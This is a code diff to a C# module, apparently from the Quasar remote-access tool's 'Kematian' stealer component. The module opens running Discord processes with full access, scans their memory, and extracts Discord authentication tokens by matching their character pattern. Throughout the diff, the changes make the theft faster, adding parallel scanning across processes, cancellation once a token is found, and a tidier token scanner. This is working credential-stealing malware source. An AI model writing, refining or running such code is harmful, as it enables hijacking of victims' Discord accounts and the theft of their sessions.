@@ -3,6 +3,8 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading.Tasks;
+using System.Threading;
 
 namespace Quasar.Client.Kematian.Discord.Methods.Memory
 {
@@ -53,17 +55,12 @@ namespace Quasar.Client.Kematian.Discord.Methods.Memory
 
         static string ScanForFirstToken(string data)
         {
-            int i = 0;
             int len = data.Length;
 
-            while (i < len - 70) // Minimum token length is 26 + 1 + 6 + 1 + 38 = 72
+            for (int i = 0; i < len - 70; i++) // Minimum token length is 26 + 1 + 6 + 1 + 38 = 72
             {
-                // Fast-forward to potential start of token (valid char)
-                while (i < len && !IsValidChar(data[i])) i++;
+                if (!IsValidChar(data[i])) continue;
 
-                if (i >= len - 70) break;
-
-                // Check if we have a potential token
                 int start = i;
                 int validCount = 0;
 
@@ -74,10 +71,9 @@ namespace Quasar.Client.Kematian.Discord.Methods.Memory
                     i++;
                 }
 
-                // If we don't have exactly 26 chars, or next char isn't dot, move on
                 if (validCount != 26 || i >= len || data[i] != '.')
                 {
-                    i = start + 1;
+                    i = start;
                     continue;
                 }
                 i++; // Skip dot
@@ -90,10 +86,9 @@ namespace Quasar.Client.Kematian.Discord.Methods.Memory
                     i++;
                 }
 
-                // If we don't have exactly 6 chars, or next char isn't dot, move on
                 if (validCount != 6 || i >= len || data[i] != '.')
                 {
-                    i = start + 1;
+                    i = start;
                     continue;
                 }
                 i++; // Skip dot
@@ -106,13 +101,12 @@ namespace Quasar.Client.Kematian.Discord.Methods.Memory
                     i++;
                 }
 
-                // If we have exactly 38 chars, we found a token
                 if (validCount == 38)
                 {
                     return data.Substring(start, 72); // 26 + 1 + 6 + 1 + 38 = 72
                 }
 
-                i = start + 1;
+                i = start;
             }
 
             return null;
@@ -124,7 +118,6 @@ namespace Quasar.Client.Kematian.Discord.Methods.Memory
             {
                 string decodedData = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                 return ScanForFirstToken(decodedData);
-                
             }
             catch
             {
@@ -132,7 +125,7 @@ namespace Quasar.Client.Kematian.Discord.Methods.Memory
             }
         }
 
-        static string DumpMemory(int pid)
+        static string DumpMemory(int pid, CancellationToken cancellationToken)
         {
             IntPtr handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
 
@@ -148,7 +141,7 @@ namespace Quasar.Client.Kematian.Discord.Methods.Memory
                 var memInfo = new MEMORY_BASIC_INFORMATION();
                 int memInfoSize = Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION));
 
-                while (true)
+                while (!cancellationToken.IsCancellationRequested)
                 {
                     int result = VirtualQueryEx(handle, address, out memInfo, (uint)memInfoSize);
                     if (result == 0) break;
@@ -158,7 +151,7 @@ namespace Quasar.Client.Kematian.Discord.Methods.Memory
                         long regionSize = memInfo.RegionSize.ToInt64();
                         if (regionSize > 0 && regionSize < MAX_REGION_SIZE)
                         {
-                            for (long offset = 0; offset < regionSize; offset += BUFFER_SIZE)
+                            for (long offset = 0; offset < regionSize && !cancellationToken.IsCancellationRequested; offset += BUFFER_SIZE)
                             {
                                 int chunkSize = (int)Math.Min(BUFFER_SIZE, regionSize - offset);
 
@@ -174,7 +167,7 @@ namespace Quasar.Client.Kematian.Discord.Methods.Memory
                                             string match = ProcessMemoryChunk(SharedBuffer, actualBytesRead);
                                             if (match != null)
                                             {
-                                                return match; // Exit as soon as we find a match
+                                                return match;
                                             }
                                         }
                                     }
@@ -182,6 +175,8 @@ namespace Quasar.Client.Kematian.Discord.Methods.Memory
                             }
                         }
                     }
+
+                    if (cancellationToken.IsCancellationRequested) break;
 
                     try
                     {
@@ -203,38 +198,64 @@ namespace Quasar.Client.Kematian.Discord.Methods.Memory
             return null;
         }
 
-        static string[] GetTokens(string[] args)
+        static int[] GetPids()
         {
             var processes = Process.GetProcessesByName("discord");
+            Array.Sort(processes, (x, y) => y.WorkingSet64.CompareTo(x.WorkingSet64));
 
-            List<string> tokens = new List<string>();
-
+            var pids = new List<int>();
             foreach (var process in processes)
+            {
+                pids.Add(process.Id);
+            }
+            return pids.ToArray();
+        }
+
+        public static string[] Tokens()
+        {
+            string token = null;
+            var pids = GetPids();
+
+            using (var cts = new CancellationTokenSource())
             {
                 try
                 {
-                    var startTime = DateTime.Now;
-                    var result = DumpMemory(process.Id);
-                    var duration = DateTime.Now - startTime;
+                    var parallelOptions = new ParallelOptions
+                    {
+                        CancellationToken = cts.Token,
+                        MaxDegreeOfParallelism = Environment.ProcessorCount
+                    };
 
-                    if (result != null)
+                    Parallel.ForEach(pids, parallelOptions, (pid, state) =>
                     {
-                        Debug.WriteLine($"Found token in {duration.TotalSeconds:F2} seconds:");
-                        tokens.Add(result);
-                        Debug.WriteLine(result);
-                    }
-                    else
-                    {
-                        Debug.WriteLine($"No tokens found in {duration.TotalSeconds:F2} seconds");
-                    }
+                        try
+                        {
+                            var foundToken = DumpMemory(pid, cts.Token);
+                            if (foundToken != null)
+                            {
+                                if (Interlocked.CompareExchange(ref token, foundToken, null) == null)
+                                {
+                                    cts.Cancel();
+                                    state.Stop();
+                                }
+                            }
+                        }
+                        catch (OperationCanceledException)
+                        {
+                            state.Stop();
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine($"Error processing PID {pid}: {ex.Message}");
+                        }
+                    });
                 }
-                catch (Exception e)
+                catch (OperationCanceledException)
                 {
-                    Debug.WriteLine($"Error with PID {process.Id}: {e.Message}");
+                    // Expected when operation is cancelled
                 }
             }
-
-            return tokens.ToArray();
+            return token != null ? new[] { token } : new string[0];
         }
     }
 }
